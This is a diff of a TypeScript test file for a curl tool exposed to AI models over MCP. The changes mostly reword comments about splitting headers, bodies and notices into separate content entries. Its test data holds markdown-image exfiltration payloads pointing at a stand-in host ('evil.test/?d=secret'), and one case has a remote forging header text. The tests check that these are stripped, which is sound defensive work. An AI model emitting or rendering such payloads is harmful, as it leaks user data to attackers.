@@ -17,11 +17,12 @@ import { createWrapper } from "../response/post-processor.js";
 import { HEADER_DUMP_PATH } from "../execution/command-executor.js";
 import { savedPathFrom } from "./curl-output.test-fixture.js";
 
-// The separator, the stub hostname and the output builder come from
-// `curl-output.test-fixture.ts`. This file still hand-builds several executor
-// returns of its own for cases the builder cannot express (a missing metadata
-// block, a dropped stdout field) — `vi.mocked` below is what type-checks those
-// against `CommandResult`.
+// The separator, the metadata block and the output builder come from
+// `curl-output.test-fixture.ts`; the stub hostname is a literal in the
+// resolver mock below, for the reason that file gives. This file still
+// hand-builds several executor returns of its own for cases the builder
+// cannot express (a missing metadata block, a dropped stdout field) —
+// `vi.mocked` below is what type-checks those against `CommandResult`.
 import { METADATA_SEPARATOR as SEP, curlOutputFor, metadataSuffix } from "./curl-output.test-fixture.js";
 
 vi.mock("../types/index.js", async () => {
@@ -80,20 +81,22 @@ afterAll(async () => {
 });
 
 /**
- * The defended body, read from the artefact.
+ * Paths of the artefacts the cases below save, recorded by
+ * `savedArtefactBytes` and removed in `afterAll`.
  *
  * **A non-JSON body is not returned inline; it is the file.** No strip stage
  * runs over it either: the artefact's only reader is the host's own file
  * tooling, and an HTML error page has to stay readable to whoever opens it, so
- * the bytes on disk are the body as it arrived. The cases below assert exactly
+ * the bytes on disk are the body as it arrived — sanitised only where it
+ * carried attack codepoints or long whitespace runs. The cases below assert
  * that. Header text is the channel that DOES take every strip stage
  * (invariant 1a) — the two must not be conflated. `LESSONS.md` RC-47.
  */
 const savedArtefacts: string[] = [];
 /**
  * The server-authored `[mcp-curl] …` notice, from whichever content entry holds
- * it. `docs/todos/018` moved it out of the body string and into its own entry
- * (`LESSONS.md` RC-46), so a test that reads `content[0]` finds the body.
+ * it. The notice is its own entry, never part of the body string (`LESSONS.md`
+ * RC-46, `docs/todos/018`), so a test that reads `content[0]` finds the body.
  */
 function noticeOf(result: { content: Array<{ text: string }> }): string {
     return result.content.map((c) => c.text).find((t) => t.startsWith("[mcp-curl]")) ?? "";
@@ -124,11 +127,11 @@ describe("curl_execute include_headers — defence pipeline", () => {
             include_headers: true,
         }));
 
-        // **The header text is content entry 1 now, not a prefix on entry 0.**
-        // `docs/todos/018` split the two remote regions into separate MCP
-        // entries (invariant 13's strong form at the output), so the header
-        // channel is read where it actually is. What is asserted is unchanged:
-        // header text takes the same strip stages as a body.
+        // **The header text is content entry 1, not a prefix on entry 0** — each
+        // remote region is its own MCP entry (invariant 13's strong form at the
+        // output, `docs/todos/018`), so the header channel is read where it
+        // actually is. What is asserted: header text takes the same strip stages
+        // as a body.
         const headerText = result.content[1]!.text;
         expect(headerText).not.toContain("evil.test");
         expect(headerText).toContain("[image removed]");
@@ -149,7 +152,7 @@ describe("curl_execute include_headers — defence pipeline", () => {
 
     it("does not let a remote forge header entries from its body", async () => {
         // **A JSON body, because the subject is the SPLIT and only a JSON body
-        // has an inline arm after `docs/todos/018`.** The transcript the remote
+        // has an inline arm (`docs/todos/018`).** The transcript the remote
         // is trying to pass off as headers is carried inside a JSON string
         // value, which is a stronger version of the same trick.
         const headers = "HTTP/2 200 \r\ncontent-type: application/json\r\n\r\n";
@@ -293,9 +296,9 @@ describe("curl_execute include_headers — boundary fidelity", () => {
             'text/markdown; charset=utf-8; profile="' + "x".repeat(300) + '"';
         const headers =
             "HTTP/2 200 \r\nx-note: ![x](https://evil.test/?d=1)\r\n\r\n";
-        // A JSON body: after `docs/todos/018` only a JSON document is returned
-        // inline, and this case reads `parsed.response`. The long declared type
-        // is still the subject — it must not evict the separator.
+        // A JSON body: only a JSON document is returned inline (`docs/todos/018`),
+        // and this case reads `parsed.response`. The long declared type is the
+        // subject — it must not evict the separator.
         mockedExecuteCommand.mockResolvedValue(curlOutputFor({ headerBlock: headers, body: '{"h":"hi"}', contentType: longCt }));
 
         const result = await executeCurlRequest(params({
@@ -431,7 +434,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             include_headers: true,
         }));
 
-        // The notice lives in its own content entry now (RC-46).
+        // The notice is its own content entry (RC-46).
         const text = noticeOf(result);
         expect(text).not.toContain("the body is unaffected");
         // And the failure is surfaced at all, rather than reading as an empty 200.
@@ -454,7 +457,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             include_headers: true,
         }));
 
-        // The notice is its own content entry now (`LESSONS.md` RC-46), so the
+        // The notice is its own content entry (`LESSONS.md` RC-46), so the
         // reassurance is read there rather than off the body.
         const notice = result.content.map((c) => c.text).find((t) => t.startsWith("[mcp-curl]"));
         expect(notice).toContain("the body is unaffected");
@@ -475,7 +478,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             max_result_size: 1000,
         }));
 
-        // The notice lives in its own content entry now (RC-46).
+        // The notice is its own content entry (RC-46).
         const text = noticeOf(result);
         const m = /response headers truncated: (\d+) of (\d+) bytes used/.exec(text);
         expect(m).not.toBeNull();
@@ -524,7 +527,7 @@ describe("curl_execute include_headers — degraded results stay honest", () => 
             max_result_size: 1000,
         }));
 
-        // The notice lives in its own content entry now (RC-46).
+        // The notice is its own content entry (RC-46).
         const text = noticeOf(result);
         expect(text).toContain("truncated to fit the inline limit");
         // And it must not invent a ratio it cannot state.
@@ -619,7 +622,7 @@ describe("curl_execute include_headers — an unsupported host says so", () => {
             include_headers: true,
         }));
 
-        // The notice lives in its own content entry now (RC-46).
+        // The notice is its own content entry (RC-46).
         const text = noticeOf(result);
         expect(text).toContain("cannot be captured on this host");
         expect(text).not.toContain("none were received");
@@ -767,9 +770,11 @@ describe("curl_execute include_headers — remaining channels", () => {
     });
 
     it("does not strip a JSON body when the content type is undetermined", async () => {
-        // The strictest-grammar posture is for the model; processResponse writes
-        // the POST-strip content to disk, so applying it to a JSON body silently
-        // rewrites the artefact jq_query later reads back.
+        // The strictest-grammar posture is for text the model reads, and a JSON
+        // body is never rewritten: it is returned inline as the origin sent it, and
+        // a saved one is the origin's octets — the artefact jq_query reads back.
+        // Applying the strictest grammar here would rewrite the document's string
+        // values on the way to the model.
         // stdout is the body alone, so what is unreachable here is the metadata
         // block, not a header/body boundary.
         const body = '{"note":"see [docs](https://example.com/x)"}';
@@ -788,10 +793,11 @@ describe("curl_execute include_headers — remaining channels", () => {
     it("treats a block with the wrong separator count as undetermined, at the consumer", async () => {
         // The parser's verdict is only worth something where it is acted on
         // (RC-31). Found, the saved artefact is the origin's body to the byte.
-        // A block one field short — the single-field shape this block replaced —
-        // must not be found: the artefact is then all of stdout, separator
-        // included, which is the undetermined arm `ParsedResponse.bodyBytes`
-        // describes. The positive control proves the difference is the count.
+        // A single-field block — content type alone, two short of the three
+        // fields the builder writes — must not be found: the artefact is then all
+        // of stdout, separator included, which is the undetermined arm
+        // `ParsedResponse.bodyBytes` describes. The positive control proves the
+        // difference is the count.
         const body = "plain body";
         const saved = async (stdout: string) => {
             mockedExecuteCommand.mockResolvedValueOnce({ ...noMetadataStdout(""), stdoutBytes: Buffer.from(stdout, "utf8") });
@@ -856,13 +862,12 @@ describe("curl_execute — both output shapes get the same defence", () => {
     }
 
     it("saves a text/markdown body verbatim too — the declared tag selects nothing", async () => {
-        // **The teeth for the pair above, and it changed direction rather than
-        // being dropped.** Those two assert a body arrives on disk unchanged; a
-        // build that defended the artefact after all would fail them, and a
-        // build that stopped saving at all would fail this one's byte equality.
-        // `text/markdown` is the declaration that used to select the most
-        // aggressive stage set, so if any declared type could still reach a
-        // strip stage from this path, it is this one.
+        // **The teeth for the pair above.** Those two assert a body arrives on
+        // disk unchanged; a build that defended the artefact would fail them, and
+        // a build that stopped saving at all would fail this one's byte equality.
+        // `text/markdown` is the declaration that selects the most aggressive
+        // stage set in `defendText`, so if any declared type could reach a strip
+        // stage from this path, it is this one.
         const body = "grab ![x](https://evil.test/?d=secret)";
         mockedExecuteCommand.mockResolvedValue(
             curlOutputFor({ body, contentType: "text/markdown" })
